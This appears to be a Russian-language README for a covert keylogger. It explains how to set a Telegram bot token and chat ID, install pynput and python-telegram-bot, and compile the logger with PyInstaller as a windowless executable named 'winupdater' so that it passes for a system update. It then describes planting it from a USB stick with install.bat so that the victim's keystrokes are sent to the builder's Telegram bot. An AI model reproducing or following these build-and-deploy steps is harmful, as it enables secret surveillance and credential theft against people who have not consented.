Это монолитная версия кей-логера.
Финальная сборка должна выполняться на Windows.

Выполни настройки в файле logger_bot.py
# ===== Конфигурация =====
TELEGRAM_BOT_TOKEN = "Твой ТОКЕН бота"
TELEGRAM_CHAT_ID = твой_чат_id_int

SEND_INTERVAL = 3600  # частота отправки уведомлений в секундах

Далее приступаем к сборке:
1. Установи Python
Перейди на сайт https://www.python.org/downloads/windows/

Скачай последнюю версию Python (например, Python 3.12.x Windows installer (64-bit)).

Запусти установщик:

ОБЯЗАТЕЛЬНО поставь галочку Add Python to PATH

Нажми Install Now

2. Открой командную строку
Нажми Win + R, введи cmd, нажми Enter.
Далее всё просто - активируй вирт.окружение, если хочешь -> 
python -m venv venv
venv\Scripts\activate

pip install pyinstaller pynput python-telegram-bot psutil

3. И собери .exe файл, для этого в папке с проектом выполни команду:
pyinstaller --noconsole --onefile --name winupdater logger_bot.py

4. Сохрани на флешку три файла:
install.bat
uninstall.bat
winupdater.exe (из папки созданной после сборки dist/)

ВСЁ! Теперь при необходимости запуски install.bat и компьютер начнёт логирование с отправкой в телеграмм уведомлений, через твоего бота(создать своего бота очень легко, разберёшься).
Для полного удаления запусти uninstall.bat